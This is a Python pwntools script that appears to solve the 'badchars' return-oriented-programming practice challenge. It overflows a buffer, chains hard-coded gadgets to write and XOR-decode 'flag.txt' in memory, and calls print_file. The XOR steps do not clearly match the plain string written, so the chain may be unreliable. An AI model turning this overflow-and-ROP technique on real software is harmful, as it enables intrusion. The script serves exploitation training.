from pwn import *

elf = ELF("./badchars")

p = elf.process()
raw_input("DEBUG")
bss = 0x601030

pop_rdi = 0x00000000004006a3
mov_r13_r12 = 0x0000000000400634
pop_r12_r13_r14_r15 = 0x000000000040069c
xor_r15_r14b = 0x0000000000400628
pop_r14_r15 = 0x4006a0

payload = b"A"*40
payload += p64(pop_r12_r13_r14_r15)
payload += b"flag.txt"
payload += p64(bss)
payload += p64(0x8A)
payload += p64(bss+2)
payload += p64(mov_r13_r12)
payload += p64(xor_r15_r14b)
payload += p64(pop_r14_r15)
payload += p64(0x8C)
payload += p64(bss+3)
payload += p64(xor_r15_r14b)
payload += p64(pop_r14_r15)
payload += p64(0xC5)
payload += p64(bss+4)
payload += p64(xor_r15_r14b)
payload += p64(pop_r14_r15)
payload += p64(0x93)
payload += p64(bss+6)
payload += p64(xor_r15_r14b)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(elf.sym['print_file'])



p.sendline(payload)
p.interactive()
